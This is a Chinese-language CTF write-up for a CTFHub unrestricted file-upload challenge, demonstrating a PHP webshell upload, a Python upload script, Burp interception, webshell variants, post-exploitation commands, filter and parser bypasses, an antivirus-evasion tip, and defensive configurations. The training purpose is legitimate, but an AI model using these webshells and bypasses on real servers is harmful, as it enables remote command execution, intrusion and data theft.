---
layout: post
title: CTFHub - 文件上传 无限制 Writeup
platform: ctfhub
date: 2026-10-23 16:18:00 +0800
categories: CTF
---

CTFHub - 文件上传 无限制 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **文件上传** → 无限制）
- 题型：Web
- 考点：**任意文件上传** → **WebShell** → **RCE**


```text
页面标题：CTFHub 文件上传 - 无限制
页面内容：只有一个上传表单

    <form action="" method="post" enctype="multipart/form-data">
        <label>Filename:</label>
        <input type="file" name="file" id="file" />
        <input type="submit" name="submit" value="Submit" />
    </form>

★ 没有任何前端/后端校验
    → 直接传 .php 文件就能执行

★ 上传位置探测：

    GET /upload/test.txt      → 404
    GET /upload/              → 403     ← ★ 目录存在（禁止列目录）
    GET /uploads/ /up/ /files/ → 404

    → 上传目录是 /upload/

★ 上传 PHP 木马：

    POST /  (multipart/form-data)
    file=shell.php
    内容：<?php system($_GET['cmd']); ?>
    submit=Submit

★ 验证执行：

    GET /upload/shell.php?cmd=id
    → uid=33(www-data) gid=33(www-data) groups=33(www-data)   ★ RCE 成功

    GET /upload/shell.php?cmd=ls
    → shell.php

    GET /upload/shell.php?cmd=ls -l
    → total 4
      -rw-r--r-- 1 www-data www-data 30 Oct 23 08:18 shell.php

★ 找 flag：

    ?cmd=pwd          → /var/www/html/upload
    ?cmd=ls -la ..    → /var/www/html/
                        ├── flag_171214013.php     ← ★ 42 字节，就是它
                        ├── index.php
                        └── upload/

    ?cmd=cat /var/www/html/flag_171214013.php
    → <?php // ctfhub{44e0ac915cd978aec19bc94b}

    ★ flag 藏在 flag_xxx.php 的 PHP 注释里
    ★ 直接访问 /flag_171214013.php 是空白（因为整个文件都在 <?php ... ?> 里，
      注释不会输出）

flag         : ctfhub{44e0ac915cd978aec19bc94b}
```

二、题目分析

**① 什么是"文件上传漏洞"**

```text
网站提供"上传文件"功能，但没有校验文件类型
→ 攻击者传一个【可执行脚本】（PHP/JSP/ASP）
→ 脚本被放到 Web 目录下
→ 攻击者通过 URL 访问它 → 脚本被服务器执行 → 拿到服务器控制权

★ 从"上传文件"升级到"执行任意命令"，这就是 RCE（远程命令执行）
```

**② 为什么这题"无限制"最危险**

```text
正常的文件上传应该有这些校验：

    ① 扩展名白名单（只允许 jpg/png/gif/pdf...）
    ② MIME type 校验（Content-Type 必须是 image/jpeg...）
    ③ 文件头（magic bytes）校验
    ④ 文件内容检查
    ⑤ 上传目录禁止执行（Nginx/Apache 配置）
    ⑥ 上传后重命名（随机名 + 白名单后缀）

这题一个都没有 → 直接传 .php 就能跑
```

**③ 什么叫 WebShell（一句话木马）**

```php
<?php system($_GET['cmd']); ?>
```

**逐段解释**：

```php
<?php              // PHP 代码开始
system(            // PHP 函数：执行系统命令，并把输出打印出来
    $_GET['cmd']   // 从 URL 参数取命令（?cmd=ls）
);
?>
```

**用起来像这样**：

```
/upload/shell.php?cmd=id
     ↓
服务器执行：system("id")
     ↓
返回：uid=33(www-data) gid=33(www-data)
     ↓
页面显示这个结果
```

**★ 效果等于"在服务器上开了个命令行"，通过浏览器就能操作。**

**④ 更常见的几种木马**

```php
<?php system($_GET['cmd']); ?>                  // 最简单
<?php eval($_POST['cmd']); ?>                   // eval 型（执行 PHP 代码）
<?php @eval($_POST['pass']); ?>                 // 中国菜刀 / 蚁剑 用的
<?php echo shell_exec($_GET['c']); ?>           // shell_exec 型
<?php passthru($_GET['c']); ?>                  // passthru 型
<?php assert($_POST['c']); ?>                   // assert 型（PHP7 前）
```

**一句话木马（最小体积）**：

```php
<?=`$_GET[0]`?>
```

```
PHP 里 `` ` `` 是"执行 shell 命令"的运算符（等价 shell_exec）
→ ?0=id 就执行 id
```

三、解题步骤

**方法一：浏览器手工上传（最简单）**

**第 1 步：准备木马文件**

在本地新建文件 `shell.php`，内容：

```php
<?php system($_GET['cmd']); ?>
```

**第 2 步：上传**

```
① 打开题目页面
② 点 "Filename:" 旁边的按钮 → 选 shell.php
③ 点 【Submit】
④ 页面会重新加载（内容没变，说明上传成功但没提示）
```

**第 3 步：访问木马**

```
① 地址栏输入：
   http://challenge-xxx:10800/upload/shell.php?cmd=id

② 如果显示：
   uid=33(www-data) gid=33(www-data) groups=33(www-data)
   
   ★ 成功了！
```

**如果 404**，说明不在 `/upload/`，试这些路径：

```
/shell.php
/uploads/shell.php
/up/shell.php
/files/shell.php
/static/shell.php
/tmp/shell.php
```

**怎么确定上传目录**：看哪些目录返回 403（存在但禁止列表）：

```
/upload/   → 403     ★ 存在
/uploads/  → 404     不存在
```

**第 4 步：执行命令探索**

```
?cmd=pwd              → 看当前目录
?cmd=ls -la           → 看当前目录内容
?cmd=ls -la ..        → 看上级目录  ★ 这题的 flag 就在这里
?cmd=cat ../flag_xxx.php
```

**第 5 步：找到 flag**

```
?cmd=ls -la ..
→ 看到 flag_171214013.php（42 字节）

?cmd=cat /var/www/html/flag_171214013.php
→ <?php // ctfhub{44e0ac915cd978aec19bc94b}
```

**第 6 步：提交 → 通关**

---

**方法二：Python 脚本上传（可复用）**

```python
import uuid, urllib.request

BASE = "http://challenge-xxx:10800"
SHELL = "<" + "?" + "php " + "system($_GET['cmd']); " + "?" + ">"

# 构造 multipart/form-data 请求
boundary = "----WebKitFormBoundary" + uuid.uuid4().hex
parts = []
parts.append(("--%s\r\n" % boundary).encode()
             + b'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
             + b"Content-Type: application/octet-stream\r\n\r\n"
             + SHELL.encode() + b"\r\n")
parts.append(("--%s--\r\n" % boundary).encode())
body = b"".join(parts)

req = urllib.request.Request(BASE + "/", data=body, method="POST",
        headers={"Content-Type": "multipart/form-data; boundary=%s" % boundary})
print(urllib.request.urlopen(req).status)

# 执行命令
import urllib.parse
u = BASE + "/upload/shell.php?cmd=" + urllib.parse.quote("ls -la ..")
print(urllib.request.urlopen(u).read().decode())
```

**★ 注意**：PowerShell 的命令行如果直接包含 `<?php system(...) ?>`，
Windows Defender 可能会拦（报"脚本包含恶意内容"）。
解决办法：把脚本写成 `.py` 文件再运行，或者像上面那样用字符串拼接。

---

**方法三：用 Burp 修改（浏览器被限制时）**

```
① Burp → Proxy → Intercept on
② 浏览器上传任意文件（比如 shell.php）
③ Burp 拦到请求：

    POST / HTTP/1.1
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxxx

    ------WebKitFormBoundaryxxx
    Content-Disposition: form-data; name="file"; filename="shell.php"
    Content-Type: application/octet-stream

    <?php system($_GET['cmd']); ?>
    ------WebKitFormBoundaryxxx--

④ 如果浏览器/系统不让你保存 .php 文件，
   可以在 Burp 里直接改 filename 和内容
⑤ Forward
```

**★ Burp 的优势**：可以随便改文件名、Content-Type、内容，
不受本地杀毒软件干扰。

---

**拿到 shell 后能做的事（信息收集）**

```bash
# 系统信息
id                          # 当前用户
uname -a                    # 内核版本
cat /etc/passwd             # 用户列表
cat /etc/hostname           # 主机名

# 找 flag
ls -la /                    # 根目录
ls -la ..                   # 上级目录
find / -name "flag*" 2>/dev/null       # 全局搜
grep -r "ctfhub{" /var/www 2>/dev/null # 内容搜

# 找敏感配置
cat /var/www/html/index.php
ls -la /var/www/html/
env                         # 环境变量

# 网络
ifconfig / ip a
netstat -an

# 提权线索
sudo -l                     # 可用的 sudo 命令
ls -la /root                # 通常无权限
```

**★ 本题 `ls -la ..` 一步就看到了 flag 文件。**

四、延伸知识

**① 文件上传漏洞的常见绕过方式（面试重点）**

**（1）前端 JS 校验**

```javascript
// 页面里的校验（可以禁用 JS 或直接用 Burp 改包绕过）
if (!/\.jpg$/.test(filename)) { alert("只允许 jpg"); return false; }
```

**绕过**：禁用 JS、用 Burp 直接发请求

**（2）后端扩展名黑名单**

```php
$blacklist = ['php', 'php3', 'php4', 'php5', 'phtml'];
if (in_array($ext, $blacklist)) die("不允许");
```

**绕过**：

```
大小写：       shell.PhP / shell.pHp
双重扩展名：   shell.php.jpg（如果取最后一个后缀就没用）
   或者       shell.jpg.php（如果只检查第一个）
特殊后缀：     shell.phtml / .php3 / .php5 / .phps / .pht
Apache 特性：  shell.php.bak（有些配置会执行）
点号截断：     shell.php.（Windows 会去掉末尾点）
空格截断：     shell.php （空格，老版本 Windows）
::$DATA：     shell.php::$DATA（Windows NTFS 数据流）
.htaccess：   上传 .htaccess 让 .jpg 当 php 执行
```

**（3）MIME type 校验**

```php
if ($_FILES['file']['type'] != 'image/jpeg') die("必须是图片");
```

**绕过**：改 Content-Type 为 `image/jpeg`（Burp 里改）

**（4）文件头（magic bytes）校验**

```php
if (substr($content, 0, 2) != "\xFF\xD8") die("不是 JPEG");
```

**绕过**：图片马

```
在图片后面追加 PHP 代码：
    copy normal.jpg /b + shell.php /a webshell.jpg

然后配合"文件包含漏洞"或"解析漏洞"利用
```

**（5）上传目录禁止执行（最有效的防护）**

```nginx
location ^~ /upload/ {
    location ~ \.(php|php5)$ { deny all; }
}
```

**绕过**：几乎没有（除非有解析漏洞）

**② 流行的上传"解析漏洞"**

```
① Apache 多后缀解析
   上传 shell.php.jpg，Apache 会从右往左找能识别的扩展名
   → 如果它不是 .jpg 处理器，就继续往左找 .php
   → 执行 PHP（老版本 Apache 有此问题）

② Nginx 解析漏洞（CVE-2013-4547 等）
   /upload/shell.jpg/x.php   → 被当 php 处理（配置不当时）

③ IIS 6.0 分号截断
   /upload/shell.asp;.jpg    → 被当 asp 处理

④ 条件竞争
   上传时先被检查、后改名/删除，中间有时间窗
   → 在上传瞬间疯狂访问，趁它还没被删执行
```

**③ WebShell 管理工具**

```
· 中国菜刀（老牌，PHP/ASP/JSP 都支持）
· 蚁剑 AntSword（开源，现代）
· 冰蝎 Behinder（加密流量，免杀）
· 哥斯拉 Godzilla（加密更强）
```

**★ 这些工具的"一句话木马"通常是**：

```php
<?php @eval($_POST['pass']); ?>
```

**④ 危害**

```text
文件上传漏洞 = 服务器沦陷的"直接入口"

上传成功后：
    · 执行任意系统命令（读文件、改文件、装后门）
    · 读取数据库配置 → 拖库
    · 内网渗透的跳板
    · 挖矿 / 勒索（真实攻击常见）

★ 这是 Web 漏洞里危害等级最高的一类（和 RCE 同级）
```

**⑤ 防护（分层）**

```text
① ★ 最有效：上传目录【禁止执行】
    Nginx: location ^~ /upload/ { location ~ \.php$ { deny all; } }
    → 就算传了 PHP 也跑不起来

② 扩展名【白名单】（不是黑名单）
    $allow = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
    if (!in_array(strtolower($ext), $allow)) die();

③ 随机重命名
    $new = md5(uniqid()) . '.' . $ext;
    → 就算传了 shell.php 也猜不到路径

④ 校验文件内容（magic bytes）
    用 finfo_file() 检查真实类型

⑤ 上传目录放在 Web 根目录【之外】
    /data/upload/ 而不是 /var/www/html/upload/
    → 通过 PHP 读文件提供下载，而不是直接访问

⑥ 限制文件大小、数量
⑦ 隔离：上传的文件用独立域名/独立服务器
```

五、总结

- **本题核心：上传 PHP 木马 → 访问执行 → 系统命令 → 找 flag。**
- 三步走：

```text
① 传 shell.php：<?php system($_GET['cmd']); ?>
② 找路径：/upload/shell.php（靠 403 探测出目录）
③ 执行：?cmd=ls -la ..   → 看到 flag_xxx.php
         ?cmd=cat /var/www/html/flag_xxx.php
```

- **三个必记要点**：

```text
① "无限制上传" = 直接传 .php 就能 RCE，不需要任何绕过技巧
② 上传后不知道路径时，用 403/404 差异探测上传目录
③ 拿到 shell 后先 ls -la ..（flag 常在上级目录）
```

- **实测 flag**：

```text
ctfhub{44e0ac915cd978aec19bc94b}
（藏在 /var/www/html/flag_171214013.php 的 PHP 注释里）
```


**手工复现要点**：

```text
· 本地新建 shell.php，内容：<?php system($_GET['cmd']); ?>
· 浏览器上传 → 访问 /upload/shell.php?cmd=id
· 如果 404，试 /uploads/ /up/ /files/，或者看哪个目录返回 403
· 拿到 shell 后：ls -la .. 找 flag 文件 → cat 它
· Windows 上如果杀毒拦了，用 Burp 改包上传
```
